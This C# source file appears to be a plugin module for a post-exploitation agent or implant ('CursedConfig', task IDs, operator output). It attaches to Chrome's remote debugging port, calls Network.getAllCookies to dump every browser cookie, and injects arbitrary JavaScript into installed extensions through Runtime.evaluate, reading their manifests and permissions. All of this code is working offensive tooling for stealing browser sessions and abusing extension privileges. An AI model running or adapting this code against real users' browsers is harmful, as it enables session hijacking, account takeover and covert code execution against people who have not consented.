using Agent;
using Agent.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Agent
{
    public partial class Plugin : IInteractivePlugin, IFilePlugin
    {
        internal List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
        {
            List<string> permissions = new List<string>();
            foreach (var permission in manifest.result.value.permissions)
            {
                permissions.Add(permission);
            }

            return permissions;
        }
        internal async Task<string> InjectGetAllCookies(ChromeJsonObject extension, string task_id)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                // Connect to Chrome's WebSocket debugger
                //Need to confirm if this is an okay value
                try
                {
                    await webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput(e.ToString(), task_id);
                    }
                    return "";
                }

                // Send a message to request cookies
                var message = new
                {
                    id = 1,
                    method = "Network.getAllCookies",
                };
                //Send our request
                string messageJson = JsonSerializer.Serialize(message);
                if(!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
                {
                    return "";
                }

                return await WebSocketHelper.ReceiveMessage(webSocket);
            }
        }
        internal async Task<string> InjectJs(string id, string jsCode, CursedConfig config, string task_id)
        {
            var extensions = await GetExtensions(config, task_id);

            foreach (var extension in extensions)
            {
                if (extension.id == id)
                {
                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
                }
            }
            return "Failed to identify specified extension.";
        }
        internal bool TryInjectJs(ChromeJsonObject extension, string jsCode, string task_id, out string response)
        {
            if (this.config.debug)
            {
                ReturnOutput("Injectin.", task_id).RunSynchronously();
            }
            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
            if (this.config.debug)
            {
                ReturnOutput("Done." + response, task_id).RunSynchronously();
            }
            return true;
        }
        internal async Task<string> TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
        {
            try
            {
                var uri = new Uri(extension.webSocketDebuggerUrl);
                return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
            }
            catch (Exception e)
            {
                if (this.config.debug)
                {
                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString() , task_id).RunSynchronously();
                }
                return "";
            }
        }
        internal async Task<string> InjectJs(string jsCode, Uri uri, string task_id)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                try
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput("Test", task_id);
                    }
                    if (this.config.debug)
                    {
                        await ReturnOutput("Connecting to " + uri.ToString(), task_id);
                    }
                    await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);
                    if (this.config.debug)
                    {
                        await ReturnOutput("Connected to " + uri.ToString(), task_id);
                    }
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput(e.ToString(), task_id);
                    }
                    return "";
                }
                if (this.config.debug)
                {
                    await ReturnOutput("building message.", task_id);
                }
                // Build the DevTools Protocol message to execute JavaScript
                var message = new
                {
                    id = 1,
                    method = "Runtime.evaluate",
                    @params = new
                    {
                        expression = jsCode,
                        returnByValue = true
                    }
                };
                if (this.config.debug)
                {
                    await ReturnOutput("Serializin", task_id);
                }

                // Convert the message to JSON and send it to the WebSocket
                string messageJson = string.Empty;
                if (this.config.debug)
                {
                    await ReturnOutput(jsCode, task_id);
                    await ReturnOutput(message.id.ToString(), task_id);
                    await ReturnOutput(message.method, task_id);
                    await ReturnOutput(message.@params.expression, task_id);
                    await ReturnOutput(message.@params.returnByValue.ToString(), task_id);
                }
                try
                {
                    messageJson = JsonSerializer.Serialize(message);
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput("Error Serializing Message" + Environment.NewLine + jsCode + Environment.NewLine + e.ToString(), task_id);
                    }
                    return "";
                }
                if (this.config.debug)
                {
                    await ReturnOutput("Done Serializin", task_id);
                }

                if (!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput("Failed to send message.", task_id);
                    }
                    return "";
                }
                if (this.config.debug)
                {
                    await ReturnOutput("Waiting for response.", task_id);
                }
                return await WebSocketHelper.ReceiveMessage(webSocket);
            }
        }
        internal async Task<List<ChromeJsonObject>> GetExtensions(CursedConfig config, string task_id)
        {
            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Fetch list of targets from DevTools Protocol
                    string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
                    string targetsJson = await client.GetStringAsync(targetsUrl);
                    if (this.config.debug)
                    {
                        await ReturnOutput(targetsJson, task_id);
                    }

                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);

                    foreach (var target in targets)
                    {
                        if (target.url.StartsWith("chrome-extension"))
                        {
                            extensions.Add(target);
                        }
                    }
                }
                catch (Exception e)
                {
                    if (this.config.debug)
                    {
                        await ReturnOutput(e.ToString(), task_id);
                    }
                }
            }
            return extensions;
        }
        internal async Task<ExtensionManifest> GetManifestFromExtension(ChromeJsonObject extension, string task_id)
        {
            if (this.config.debug)
            {
                await ReturnOutput(extension.id + Environment.NewLine, task_id);
            }

            if (!TryInjectJs(extension, "chrome.runtime.getManifest()", task_id, out var response)) 
            {
                if (this.config.debug)
                {
                    await ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
                }
                return null; 
            }
            if (this.config.debug)
            {
                await ReturnOutput(response, task_id);
            }

            JsonDocument responseJsonDocument;

            try
            {
                responseJsonDocument = JsonDocument.Parse(response);
            }
            catch (Exception e)
            {
                await ReturnOutput("Failure getting manifest." + Environment.NewLine + e.ToString(), task_id);
                return null;
            }

            JsonElement responseRoot = responseJsonDocument.RootElement;


            if (!responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                await ReturnOutput("Failure parsing manifest from result.", task_id);
                return null;
            }

            try
            {
                return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
            }
            catch (Exception e)
            {
                await ReturnOutput("Failure deserializing manifest." + Environment.NewLine + e.ToString(), task_id);
                return null;
            }
        }
    }
}
